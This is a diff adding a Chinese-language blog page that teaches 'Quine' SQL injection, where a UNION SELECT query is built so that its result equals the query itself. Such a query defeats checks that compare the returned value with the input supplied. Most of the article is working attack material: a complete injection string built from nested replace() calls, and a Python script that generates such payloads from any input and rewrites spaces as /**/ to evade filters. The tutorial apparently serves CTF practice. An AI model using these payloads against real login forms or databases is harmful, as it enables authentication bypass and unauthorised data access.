@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>sql注入 Quine注入解析 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>sql注入 Quine注入解析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/24
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00a596">数据库</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/sql/" style="color: #ff7d73">sql</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>quine注入,即查询的结果是查询的语句</p>
+<p>首先看看如下sql语句会返回什么</p>
+<pre><code class="sql">select replace(&quot;.&quot;,char(46),&quot;.&quot;);
+</code></pre>
+<p>返回了一个点</p>
+<p>匹配字符串”.”中ascii码为46的字符并替换为”.”,也就是将”.”转换为”.”并返回</p>
+<p>继续看下面这个sql语句</p>
+<pre><code class="sql">select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ddd986e7bc6d49d995755fb301370584.png" alt="在这里插入图片描述">很相似,但并不完全一致,查询出的结果是双引号的</p>
+<p>此处将字符串    <strong>replace(“.”,char(46),”.”)</strong></p>
+<p>中ascii码为46的字符替换为另一字符串 <strong>replace(“.”,char(46),”.”)</strong></p>
+<p>也就是</p>
+<p><strong>replace(“replace(“.”,char(46),”.”)”,char(46),”replace(“.”,char(46),”.”)”)</strong></p>
+<p>观察原来的查询语句</p>
+<p><strong>replace(‘ replace(“.”,char(46),”.”)’,char(46),’replace(“.”,char(46),”.”)’)</strong></p>
+<p>那么我们只需要将双引号替换成单引号就行</p>
+<pre><code class="sql">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));
+</code></pre>
+<p>所以需要替换的字符串就变成了</p>
+<pre><code class="sql">&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;
+</code></pre>
+<p>这一步是替换单双引号</p>
+<pre><code class="sql">select replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39));
+</code></pre>
+<p>这一步是替换点为相关字符</p>
+<pre><code class="sql">select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
+</code></pre>
+<p>最终得到如上结果</p>
+<p>这样我们确实是可以执行sql语句了,但是还需要解决注入的问题(这样只能堆叠)<br>所以加入union select的sql语句如下</p>
+<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<h1 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h1><p>构造过程如下<br>第一步拿基本语句作为替换语句<br>比如我想要 1’union select #</p>
+<pre><code class="sql">1&quot;union select #
+</code></pre>
+<p>转单引号为双引号</p>
+<pre><code class="sql">1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#
+</code></pre>
+<p>放入基本语句</p>
+<p>第二步拼接</p>
+<pre><code class="sql">replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)
+</code></pre>
+<pre><code class="sql">replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)
+</code></pre>
+<p>补全</p>
+<pre><code class="sql">1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<h1 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h1><p>适用于如下的条件<br><img src="https://img-blog.csdnimg.cn/img_convert/8af6284c4c69e50af99460d0e3239738.png" alt="image-20230424135507408"><img src="https://img-blog.csdnimg.cn/img_convert/b0d43f37612ab511373ebcf8ca00f301.png" alt="image-20230424135535557"></p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="python">sql = input (&quot;输入你的sql语句,不用写关键查询的信息  形如 1&#39;union select #\n&quot;)
+sql2 = sql.replace(&quot;&#39;&quot;,&#39;&quot;&#39;)
+base = &quot;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&quot;
+final = &quot;&quot;
+def add(string):
+    if (&quot;--+&quot; in string):
+        tem = string.split(&quot;--+&quot;)[0] + base + &quot;--+&quot;
+    if (&quot;#&quot; in string):
+        tem = string.split(&quot;#&quot;)[0] + base + &quot;#&quot;
+    return tem
+def patch(string,sql):
+    if (&quot;--+&quot; in string):
+        return sql.split(&quot;--+&quot;)[0] + string + &quot;--+&quot;
+    if (&quot;#&quot; in string):
+        return sql.split(&quot;#&quot;)[0] + string + &quot;#&quot;
+
+res = patch(base.replace(&quot;.&quot;,add(sql2)),sql).replace(&quot; &quot;,&quot;/**/&quot;).replace(&quot;&#39;.&#39;&quot;,&#39;&quot;.&quot;&#39;)
+
+print(res)
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
